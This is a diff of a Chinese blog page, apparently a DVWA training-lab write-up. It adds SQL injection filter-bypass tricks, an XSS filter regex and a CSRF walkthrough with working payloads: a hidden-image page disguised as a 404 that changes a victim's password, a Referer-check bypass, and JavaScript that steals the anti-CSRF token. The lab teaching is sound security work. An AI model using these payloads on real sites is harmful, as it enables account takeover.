@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">710字</span>
+            <span class="post-count">1.8k字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">3分钟</span>
+            <span class="post-count">8分钟</span>
         </span>
     </span>
 </div>
@@ -110,27 +110,11 @@
 <h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p>这个就很有意思了，新手很值得学习，代码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
 <p>引用<a href="https://blog.csdn.net/qq_45555226/article/details/102884030" target="_blank" rel="noopener">大佬</a>的一张图可以很直观的看到从low到impossible级别所加的防御机制</p>
 <img src="/2020/04/02/DVWA/1.png" style="zoom: 67%;">
 
-
-
-
-
-
-
-
-
-
-
-
-
+<p>一般来讲，<strong>is_numeric()</strong> 可以利用16进制绕过，比如 1 or 1=1  &gt;&gt;0x314f52313d31</p>
+<p>可以考虑采用<strong>正则表达式</strong>的方法来取代is_numberic函数</p>
 <p>一、如果发现一个url可能是注入点之后我们可以尝试手注，但是一般的网站都会过滤一些字符串。</p>
 <p>在^没有被过滤的时候可以利用它来测试</p>
 <p>异或：xor或^</p>
@@ -155,6 +139,64 @@
 <p>8、使用/<strong>/注释符来，重组关键字 un/</strong>/i/**/on</p>
 <p>9、注释负：//，– , /**/, #, –+, – -, ;,%00,–a</p>
 <p>如果是使用gbk的网页编码的网站也可以利用宽字节来绕过 </p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br></pre></td></tr></table></figure>
+
+<p> i 表示不区分大小写；<br>       “/[a-zA-Z]/“ &lt;==&gt;”/[a-z]/i”</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><strong>白盒测试，源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">$pass_new = md5( $pass_new );</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，这里只对GET进行了防sql注入，并没防CSRF机制</p>
+<p>构造页面test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://127.0.0.1:12138/vulnerabilities/csrf/?password_new=123123chj&amp;password_conf=123123chj&amp;Change=Change#"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="number">404</span>&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>只要引诱别人点击此，就可成功修改其密码。</p>
+<p><strong>黑盒测试：</strong></p>
+<p><strong>抓包查看有没有token</strong></p>
+<p><strong>如果没有token，直接请求这个页面，不带refer</strong></p>
+<p><strong>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</strong></p>
+<p>抓包分析，发现有refer</p>
+<p>删除refer观察发现返回结果一致</p>
+<p>直接构造url，欺骗用户点击即可。</p>
+<hr>
+<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a><strong>medium</strong></h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>防CSRF攻击代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ])</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eregi(string pattern, string str)：</span><br><span class="line"><span class="comment">#检查str中是否含有pattern（不区分大小写），如果有返回True，反之False。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP超全局变量$_SERVER中的两个值：</span><br><span class="line">$_SERVER[<span class="string">'HTTP_REFERER'</span>]：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。</span><br><span class="line">$_SERVER[<span class="string">'SERVER_NAME'</span>]：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。</span><br></pre></td></tr></table></figure>
+
+<p>Referer参数的值，表示来源地址</p>
+<p>Host：请求资源所在服务器</p>
+<p>这种机制下，就要求来源地址要包含服务器主机地址</p>
+<p><strong>绕过方式：</strong></p>
+<p>假设攻击服务器主机的域名的域名为：<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
+<p>攻击者本机域名为：<a href="http://www.ccc.com" target="_blank" rel="noopener">www.ccc.com</a></p>
+<p>则只需要将文件名改为<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
+<p>那么访问的时候refer便是<a href="http://www.ccc.com/www.chj.com" target="_blank" rel="noopener">www.ccc.com/www.chj.com</a></p>
+<p>成功包含host，即可绕过。</p>
+<p><strong>目前高版本的PHP已经放弃这个函数了，如php5.3</strong></p>
+<hr>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a><strong>high</strong></h3><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>防护机制：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>
+
+<p>抓包发现，这个token是随机生成的，所以要想绕过此机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
+<p>攻击代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(document.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="keyword">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = /user_token\<span class="string">' value\=\'(.*?)\' \/\&gt;/;</span></span><br><span class="line"><span class="string">            var match = text.match(regex);</span></span><br><span class="line"><span class="string">            console.log(match);</span></span><br><span class="line"><span class="string">            alert(match[1]);</span></span><br><span class="line"><span class="string">                var token = match[1];</span></span><br><span class="line"><span class="string">                    var new_url = '</span>http:<span class="comment">//127.0.0.1/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=test&amp;password_conf=test&amp;Change=Change';</span></span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="keyword">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="keyword">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
       
       <!-- reward -->
@@ -239,6 +281,15 @@
   
   
   <nav class="article-nav">
+    
+      <a href="/2020/04/02/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            常见渗透工具的使用
+          
+        </div>
+      </a>
     
     
       <a href="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/" class="article-nav-link">
